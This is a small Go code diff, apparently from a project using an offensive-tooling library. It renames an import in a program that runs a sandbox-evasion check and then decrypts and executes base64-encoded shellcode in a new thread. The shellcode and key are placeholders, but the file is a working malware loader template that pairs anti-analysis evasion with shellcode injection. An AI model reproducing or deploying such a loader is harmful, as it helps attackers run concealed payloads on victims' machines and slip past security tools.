@@ -3,7 +3,7 @@ package main
 import "C"
 import (
 	"github.com/MrTuxx/OffensiveGolang/pkg/evasion"
-	shellcode "github.com/MrTuxx/OffensiveGolang/pkg/payloads/injections/createThread"
+	"github.com/MrTuxx/OffensiveGolang/pkg/payloads/injections/createThread"
 )
 
 func main() {
@@ -12,5 +12,5 @@ func main() {
 	evasion.CheckScreen()
 	enc_string := "<SHELLCODE ENCRYPTED AND BASE64-ENCODED>"
 	key := "<KEY BASE64-ENCODED>"
-	shellcode.ShellCodeThreadExecute(enc_string, key)
+	createThread.ShellCodeThreadExecute(enc_string, key)
 }
